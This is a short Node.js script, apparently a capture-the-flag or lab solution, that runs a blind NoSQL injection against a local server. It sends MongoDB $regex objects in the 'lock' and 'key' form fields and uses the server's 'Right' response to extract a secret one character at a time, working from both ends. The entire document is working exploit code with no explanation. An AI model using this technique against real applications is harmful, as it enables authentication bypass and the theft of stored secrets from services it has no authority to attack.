var request = require('request');
var util = require('util-crack');
var url = 'http://127.0.0.1:49090';
var ret = [];
var ret2 = [];

function LeftToRight (ret) {
  var s = util.random(null, 1);
  var lock = {"$regex": "^" + ret.join('') + s + "."}
  request.post(url, {form:{lock: lock, key: lock}}, function (err, res, body) {
    if (/Right/.test(body)) {
      ret.push(s);
      console.log('LeftToRight: ' + ret.join(''))
      LeftToRight(ret);
    } else {
      LeftToRight(ret);
    }
  });
}

function RightToLeft (ret2) {
  var s = util.random(null, 1);
  var lock = {"$regex": "." + s + ret2.join('') + "$"}
  request.post(url, {form:{lock: lock, key: lock}}, function (err, res, body) {
    if (/Right/.test(body)) {  
      ret2.unshift(s);
      console.log('RightToLeft: ' + ret2.join(''));
      RightToLeft(ret2);
    } else {
      RightToLeft(ret2);
    }
  });
}

LeftToRight(ret)
RightToLeft(ret2)